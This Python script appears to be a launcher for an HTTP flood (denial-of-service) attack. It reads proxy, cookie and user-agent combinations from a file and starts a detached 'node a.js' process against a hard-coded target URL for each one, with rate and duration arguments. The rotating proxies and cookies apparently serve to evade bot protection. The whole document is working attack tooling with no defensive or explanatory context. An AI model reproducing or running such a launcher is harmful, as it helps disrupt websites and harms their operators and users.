import subprocess

# Function to read the proxy IP, cookie, and user-agent data from the file
def read_proxy_cookie(file_path):
    proxies_cookies_useragents = []
    with open(file_path, 'r') as file:
        for line in file:
            if '|' in line:
                proxyip, cookie, useragent = line.strip().split('|')
                proxyip = proxyip.strip()
                cookie = cookie.strip()
                useragent = useragent.strip()
                if proxyip and cookie and useragent:
                    proxies_cookies_useragents.append((proxyip, cookie, useragent))
    return proxies_cookies_useragents

# Specify the file path for the 'cookie.txt' file
cookie_file_path = 'cookie.txt'

# Read the list of proxy IP, cookie, and user-agent combinations from the file
proxies_cookies_useragents = read_proxy_cookie(cookie_file_path)
import random
# Check if there are valid proxy IP, cookie, and user-agent combinations
if proxies_cookies_useragents:
    url = 'https://hitsagainstaraid.click'
    time = '100'
    thread = '1'
    rate = '120'
    method = 'GET'
    
    # Execute the Node.js script for each combination
    for proxyip, cookie, useragent in proxies_cookies_useragents:

        subprocess.run(['screen', '-dm', 'node','a.js', url, '30', '1', proxyip, '10', cookie, 'GET',useragent])

else:
    print("Error: No valid proxy IP, cookie, and user-agent combinations found in 'cookie.txt'.")
